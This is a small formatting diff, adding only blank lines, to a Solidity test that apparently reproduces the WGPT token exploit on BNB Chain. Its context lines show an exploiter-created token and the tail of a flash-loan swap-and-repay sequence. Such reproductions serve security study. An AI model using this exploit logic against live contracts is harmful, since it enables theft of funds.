@@ -15,14 +15,17 @@ import "./../interface.sol";
 // https://twitter.com/BeosinAlert/status/1679028240982368261
 
 interface IWGPT is IERC20 {
+
     function isSwap() external returns (bool);
 
     function burnToken() external returns (bool);
 
     function burnRate() external returns (uint256);
+
 }
 
 contract WGPTTest is Test {
+
     IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     // Token created by the exploiter
     IERC20 private constant ExpToken = IERC20(0xe1272a840F574b68dE861eC5009784e3411cb96c);
@@ -136,4 +139,5 @@ contract WGPTTest is Test {
         WGPT_BUSDT.swap(0, amounts[1], address(this), bytes(""));
         BUSDT.transfer(address(PoolV3), 76_727_748_945_585_195_946_976 + fee0);
     }
+
 }
